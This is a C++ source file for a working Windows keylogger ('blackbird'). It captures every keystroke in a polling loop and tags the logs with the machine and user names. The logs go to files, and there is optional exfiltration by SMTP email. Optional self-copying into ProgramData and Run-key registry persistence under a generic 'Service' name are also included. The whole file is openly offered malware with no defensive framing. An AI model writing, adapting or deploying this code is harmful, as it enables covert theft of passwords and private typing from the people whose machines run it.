#include <algorithm>
#include <array>
#include <chrono>
#include <codecvt>
#include <cstddef>
#include <cstdint>
#include <cstdlib>
#include <cwctype>
#include <filesystem>
#include <format>
#include <fstream>
#include <iostream>
#include <locale>
#include <string>
#include <thread>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <lmcons.h>

#pragma comment(lib, "ws2_32.lib")

namespace blackbird
{
namespace utility
{
[[nodiscard]]
std::wstring executable_path  ()
{
  std::wstring result(MAX_PATH, L'\0');
  GetModuleFileNameW (nullptr, result.data(), static_cast<DWORD>(result.size()));
  result.erase       (result.find(L'\0'));
  return result;
}
[[nodiscard]]
std::wstring computer_name    ()
{
  DWORD        size  (MAX_COMPUTERNAME_LENGTH + 1);
  std::wstring result(size, L'\0');
  GetComputerNameW   (result.data(), &size);
  result.erase       (result.find(L'\0'));
  return result;
}
[[nodiscard]]
std::wstring user_name        ()
{
  DWORD        size  (UNLEN + 1);
  std::wstring result(size, L'\0');
  GetUserNameW       (result.data(), &size);
  result.erase       (result.find(L'\0'));
  return result;
}
[[nodiscard]]
std::wstring locale_bcp_47_tag(HKL locale)
{
  std::wstring result(16, L'\0');
  LCIDToLocaleName   (MAKELCID(LOWORD(locale), SORT_DEFAULT), result.data(), static_cast<std::int32_t>(result.size()), 0);
  result.erase       (result.find(L'\0'));
  return result;
}

bool         create_process   (const std::wstring& command_line, const std::wstring& working_directory = std::wstring())
{
  STARTUPINFOW        startup_info;
  PROCESS_INFORMATION process_info;
  std::memset(&startup_info, 0, sizeof(STARTUPINFOW));
  std::memset(&process_info, 0, sizeof(PROCESS_INFORMATION));
  startup_info.cb = sizeof(STARTUPINFOW);

  if(!CreateProcessW(nullptr, const_cast<LPWSTR>(command_line.data()), nullptr, nullptr, false, CREATE_NEW_CONSOLE, nullptr, working_directory.empty() ? nullptr : working_directory.data(), &startup_info, &process_info))
    return false;

  CloseHandle(process_info.hProcess);
  CloseHandle(process_info.hThread );
  return true;
}
bool         set_registry     (const HKEY key, const std::wstring& sub_key, const std::wstring& name, const std::wstring& value)
{
  HKEY handle = nullptr;

  const auto create_result = RegCreateKeyExW(key, sub_key.c_str(), 0, nullptr, REG_OPTION_NON_VOLATILE, KEY_READ | KEY_WRITE, nullptr, &handle, nullptr);
  if (create_result != ERROR_SUCCESS)
    return false;

  const auto set_result = RegSetValueExW(handle, name.c_str(), 0, REG_SZ, reinterpret_cast<const std::uint8_t*>(value.c_str()), static_cast<DWORD>(value.size() * sizeof(wchar_t)) + 1);

  RegCloseKey(handle);
  return set_result == ERROR_SUCCESS;
}
bool         send_email       (const std::string& host_name, const std::string& api_key, const std::string& email_address, const std::wstring& subject, const std::wstring& content)
{
  WSADATA wsa_data;
  WSAStartup(MAKEWORD(1, 1), &wsa_data);

  const LPHOSTENT host    = gethostbyname(host_name.c_str());
  const SOCKET    socket  = ::socket     (PF_INET, SOCK_STREAM, 0);
  const LPSERVENT service = getservbyname("smtp", nullptr);
  SOCKADDR_IN     address ;
  address.sin_family = AF_INET;
  address.sin_port   = service ? service->s_port : htons(IPPORT_SMTP);
  address.sin_addr   = *reinterpret_cast<LPIN_ADDR>(*host->h_addr_list);
  
  if (connect(socket, reinterpret_cast<PSOCKADDR>(&address), sizeof address))
    return false;

  std::string sent;
  std::string received(4096, '\0');
  std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
  recv(socket, received.data(), static_cast<std::int32_t>(received.size()), 0);
  sent = "AUTH LOGIN\r\n";
  send(socket, sent    .data(), static_cast<std::int32_t>(sent    .size()), 0);
  recv(socket, received.data(), static_cast<std::int32_t>(received.size()), 0);
  sent = "YXBpa2V5\r\n";
  send(socket, sent    .data(), static_cast<std::int32_t>(sent    .size()), 0);
  recv(socket, received.data(), static_cast<std::int32_t>(received.size()), 0);
  sent = api_key + "\r\n";
  send(socket, sent    .data(), static_cast<std::int32_t>(sent    .size()), 0);
  recv(socket, received.data(), static_cast<std::int32_t>(received.size()), 0);
  sent = "MAIL FROM:<" + email_address + ">\r\n";
  send(socket, sent    .data(), static_cast<std::int32_t>(sent    .size()), 0);
  recv(socket, received.data(), static_cast<std::int32_t>(received.size()), 0);
  sent = "RCPT TO:<" + email_address + ">\r\n";
  send(socket, sent    .data(), static_cast<std::int32_t>(sent    .size()), 0);
  recv(socket, received.data(), static_cast<std::int32_t>(received.size()), 0);
  sent = "DATA\r\n";
  send(socket, sent    .data(), static_cast<std::int32_t>(sent    .size()), 0);
  recv(socket, received.data(), static_cast<std::int32_t>(received.size()), 0);
  sent = "From: \"Logger\" <" + email_address + ">\r\n";
  send(socket, sent    .data(), static_cast<std::int32_t>(sent    .size()), 0);
  sent = "To: \"Logger\" <"   + email_address + ">\r\n";
  send(socket, sent    .data(), static_cast<std::int32_t>(sent    .size()), 0);
  sent = "Subject:=?utf-8?Q?" + converter.to_bytes(subject) + "?=\r\n";
  send(socket, sent    .data(), static_cast<std::int32_t>(sent    .size()), 0);
  sent = "Content-Type: text/html; charset=utf-8\r\n";
  send(socket, sent    .data(), static_cast<std::int32_t>(sent    .size()), 0);
  sent = "\r\n";
  send(socket, sent    .data(), static_cast<std::int32_t>(sent    .size()), 0);
  sent = converter.to_bytes(content);
  send(socket, sent    .data(), static_cast<std::int32_t>(sent    .size()), 0);
  sent = "\r\n.\r\n";
  send(socket, sent    .data(), static_cast<std::int32_t>(sent    .size()), 0);
  recv(socket, received.data(), static_cast<std::int32_t>(received.size()), 0);
  sent = "QUIT\r\n";
  send(socket, sent    .data(), static_cast<std::int32_t>(sent    .size()), 0);
  recv(socket, received.data(), static_cast<std::int32_t>(received.size()), 0);

  closesocket(socket);
  WSACleanup ();

  return true;
}
}

struct settings
{
  std::chrono::milliseconds update_interval     {10};
  std::chrono::seconds      save_interval       {900};

  bool                      save_to_file        {true};
  std::wstring              file_prefix         ;

  bool                      save_to_email       {false};
  std::string               email_host          ;
  std::string               email_api_key       ;
  std::string               email_address       ;

  bool                      copy_to_system      {false};
  std::wstring              system_directory    {_wgetenv(L"ProgramData")};

  bool                      auto_run_on_startup {false};
  std::wstring              registry_name       {L"Service"};
};

class key_logger
{
public:
  using clock      = std::chrono::system_clock;
  using time_point = clock::time_point;

  explicit key_logger  (settings _settings = settings()) : settings_(std::move(_settings))
  {
#ifdef _DEBUG
    AllocConsole      ();
    SetConsoleOutputCP(GetACP());
    freopen           ("CONIN$" , "r", stdin );
    freopen           ("CONOUT$", "w", stderr);
    freopen           ("CONOUT$", "w", stdout);
#else
    if (settings_.copy_to_system)
    {
      const auto path             = utility::executable_path();
      const auto target_directory = settings_.system_directory + L"\\" + std::filesystem::path(path).filename().replace_extension().c_str() + L"\\";
      const auto target_path      = target_directory + std::filesystem::path(path).filename().c_str();
      if (path != target_path)
      {
        std::filesystem::create_directory(target_directory);
        std::filesystem::copy            (path, target_path, std::filesystem::copy_options::overwrite_existing);
        utility::create_process          (target_path, target_directory);
        std::exit                        (0);
      }
    }

    if (settings_.auto_run_on_startup)
    {
      const std::wstring sub_key(LR"(Software\Microsoft\Windows\CurrentVersion\Run)");
      const std::wstring value  (L"\"" + utility::executable_path() + L"\"");
      utility::set_registry(HKEY_LOCAL_MACHINE, sub_key, settings_.registry_name, value) || // Run as admin necessary.
      utility::set_registry(HKEY_CURRENT_USER , sub_key, settings_.registry_name, value);   // Run as admin not necessary.
    }
#endif
  }
  key_logger           (const key_logger&  that) = default;
  key_logger           (      key_logger&& temp) = default;
  virtual ~key_logger  ()                        = default;
  key_logger& operator=(const key_logger&  that) = default;
  key_logger& operator=(      key_logger&& temp) = default;

  [[noreturn]]
  void                run     ()
  {
    while (true)
    {
      GetKeyboardState(keyboard_state_.data());

      const auto locale     = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), nullptr));
      const auto locale_tag = utility::locale_bcp_47_tag(locale);
      std::setlocale(LC_ALL, std::string(locale_tag.begin(), locale_tag.end()).c_str());

      for (std::size_t i = 0; i < keyboard_state_.size(); ++i)
      {
        if (GetAsyncKeyState(static_cast<std::int32_t>(i)) < 0)
        {
          if (!keyboard_memory_[i])
          {
            keyboard_memory_[i] = true;

            wchar_t character;
            ToUnicodeEx(static_cast<std::uint32_t>(i), 0, keyboard_state_.data(), &character, 1, 0, locale);
            if ((GetAsyncKeyState(VK_SHIFT) < 0) != ((GetKeyState(VK_CAPITAL) & 1) != 0))
              character = std::towupper(character);
            if (character != L'\0')
              log_ += character;
#ifdef _DEBUG
            std::wcout << character;
#endif
          }
        }
        else
          keyboard_memory_[i] = false;
      }

      if (auto now = clock::now(); now - last_save_ >= settings_.save_interval)
      {
        if (!log_.empty())
        {
          const auto name = log_name(last_save_);

          if (settings_.save_to_file)
          {
            std::wofstream file(settings_.file_prefix + name + L".txt");
            file.imbue(std::locale(std::string(locale_tag.begin(), locale_tag.end())));
            file << log_;
          }

          if (settings_.save_to_email)
            utility::send_email(settings_.email_host, settings_.email_api_key, settings_.email_address, name, log_);

          log_.clear();
        }

        last_save_ = now;
      }

      std::this_thread::sleep_for(settings_.update_interval);
    }
  }

protected:
  [[nodiscard]]
  static std::wstring log_name(const time_point& time)
  {
    return utility::computer_name() + L" " + utility::user_name() + L" " + std::format(L"{:%Y %m %d %H %M %S}", std::chrono::time_point_cast<std::chrono::seconds>(time));
  }

  settings                      settings_        {};
  std::wstring                  log_             {};
  std::array<std::uint8_t, 256> keyboard_state_  {};
  std::array<bool        , 256> keyboard_memory_ {};
  time_point                    last_save_       {clock::now()};
};
}

std::int32_t WinMain(HINSTANCE, HINSTANCE, LPTSTR, std::int32_t)
{
  const blackbird::settings settings
  {
    .update_interval     = std::chrono::milliseconds(10),
    .save_interval       = std::chrono::seconds     (900),

    .save_to_file        = true,
    .file_prefix         = L"" ,

    .save_to_email       = false,
    .email_host          = "",
    .email_api_key       = "",
    .email_address       = "",

    .copy_to_system      = false,
    .system_directory    = _wgetenv(L"ProgramData"),

    .auto_run_on_startup = false,
    .registry_name       = L"Service"
  };

  blackbird::key_logger(settings).run();
}
